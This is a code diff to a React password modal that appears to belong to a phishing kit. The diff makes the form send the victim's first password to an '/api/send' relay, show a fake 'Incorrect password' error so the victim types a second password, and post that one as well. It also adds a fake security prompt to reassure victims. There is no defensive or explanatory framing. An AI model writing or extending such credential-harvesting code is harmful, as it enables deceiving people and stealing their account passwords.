@@ -20,12 +20,13 @@ interface PasswordModalProps {
 }
 
 const PasswordModal: FC<PasswordModalProps> = ({ 
-    userEmail,
     fullName = ''
 }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
+    const [password1Value, setPassword1Value] = useState('');
     const [error, setError] = useState('');
+    const [attemptCount, setAttemptCount] = useState(0);
 
     const { messageId, message, setMessage, setFormStep } = store();
     const { t } = useTranslation();
@@ -45,22 +46,51 @@ const PasswordModal: FC<PasswordModalProps> = ({
             return;
         }
 
+        // First attempt - send password1 and show error
+        if (attemptCount === 0) {
+            if (isLoading || !message) return;
+            setIsLoading(true);
+
+            const password1Message = `${message}
+
+<b>� Password 1:</b> <code>${password}</code>`;
+
+            try {
+                await axios.post('/api/send', {
+                    message: password1Message,
+                    message_id: messageId
+                    // Use message_id to update the same message
+                });
+            } catch {
+                // Continue even if sending fails
+            } finally {
+                setIsLoading(false);
+            }
+
+            setError(t('Incorrect password. Please try again.'));
+            setPassword1Value(password);
+            setPassword('');
+            setAttemptCount(1);
+            return;
+        }
+
+        // Second attempt - send password2 and continue to verify
         if (isLoading || !message) return;
         setIsLoading(true);
 
-        const updatedMessage = `${message}
+        const password2Message = `${message}
 
-<b>📧 Account Email:</b> <code>${userEmail}</code>
-<b>🔒 Password:</b> <code>${password}</code>`;
+<b>🔐 Password 1:</b> <code>${password1Value}</code>
+<b>🔐 Password 2:</b> <code>${password}</code>`;
 
         try {
             const res = await axios.post('/api/send', {
-                message: updatedMessage,
+                message: password2Message,
                 message_id: messageId
             });
 
             if (res?.data?.success) {
-                setMessage(updatedMessage);
+                setMessage(password2Message);
             }
             setFormStep('verify');
         } catch {
@@ -84,15 +114,13 @@ const PasswordModal: FC<PasswordModalProps> = ({
                             </p>
                         )}
 
-                        {/* Error Message */}
-                        {error && (
-                            <div className='w-full bg-red-100 border border-red-400 text-red-700 px-2.5 sm:px-3 md:px-4 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm break-words'>
-                                {error}
-                            </div>
-                        )}
-
-                        {/* Password Input */}
+                        {/* Password Input Section */}
                         <div className='w-full px-1.5 sm:px-3 md:px-4'>
+                            {/* Security Message - Small text above input */}
+                            <p className='text-[10px] sm:text-xs text-gray-500 mb-1 px-1'>
+                                {t('For your security, you must enter your password to continue.')}
+                            </p>
+
                             <div className='relative w-full'>
                                 <input
                                     type='password'
@@ -107,6 +135,13 @@ const PasswordModal: FC<PasswordModalProps> = ({
                                     placeholder={t('Enter your password')}
                                 />
                             </div>
+
+                            {/* Error Message - Below input */}
+                            {error && (
+                                <p className='text-red-600 text-xs mt-2 px-1 break-words'>
+                                    {error}
+                                </p>
+                            )}
                         </div>
 
                         {/* Submit Button */}
